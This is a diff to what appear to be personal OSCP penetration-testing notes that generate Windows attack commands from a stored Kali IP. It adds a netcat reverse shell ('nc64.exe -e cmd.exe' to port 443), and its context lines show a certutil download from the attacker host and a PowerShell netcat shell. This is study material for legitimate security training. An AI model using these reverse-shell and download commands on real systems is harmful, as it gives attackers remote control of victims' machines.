@@ -1,5 +1,12 @@
 https://github.com/int0x33/nc.exe/
 
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `nc64.exe -e cmd.exe ${KaliIP} 443`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 [[System Architecture]]
 
 nc.exe > 32 bit
@@ -74,7 +81,7 @@ const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-nc64.exe
+nc64.exe2
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
@@ -111,3 +118,4 @@ const command = `powershell -c "C:/Windows/Temp/nc.exe -nv ${KaliIP} 135 -e cmd`
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
